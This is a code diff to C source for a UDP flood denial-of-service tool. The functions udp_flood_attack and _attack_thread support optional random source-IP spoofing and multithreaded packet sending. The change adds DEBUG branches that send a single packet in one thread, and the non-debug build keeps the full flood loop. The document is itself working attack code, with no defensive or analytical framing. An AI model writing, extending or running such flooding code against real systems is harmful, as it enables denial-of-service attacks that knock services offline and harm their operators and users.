@@ -131,6 +131,9 @@ static void _attack_thread(pUFTP parameters)
     int sport = parameters->sport;
     int dport = parameters->dport;
 
+#ifdef DEBUG
+    _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
+#else
     if (parameters->random_saddr)
     {
         saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
@@ -152,6 +155,7 @@ static void _attack_thread(pUFTP parameters)
             _send_udp_packet(daddr, dport, saddr, sport, rep, dp);
         }
     }
+#endif
 }
 
 int udp_flood_attack(char *url, int port, ...)
@@ -185,10 +189,16 @@ int udp_flood_attack(char *url, int port, ...)
     parameters->dp = dp;
     parameters->ddp = ddp;
 
+#ifndef DEBUG
     pthread_t tid_list[thread_number];
     pthread_attr_t attr;
     int ret;
-    // only one process
+#endif
+
+#ifdef DEBUG
+    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
+    _attack_thread(parameters);
+#else
     for (i = 0; i < thread_number; i++)
     {
         //input->serial_num = (i * input->max_thread) + j;
@@ -216,5 +226,6 @@ int udp_flood_attack(char *url, int port, ...)
     {
         pthread_join(tid_list[i], NULL);
     }
+#endif
     return 0;
 }
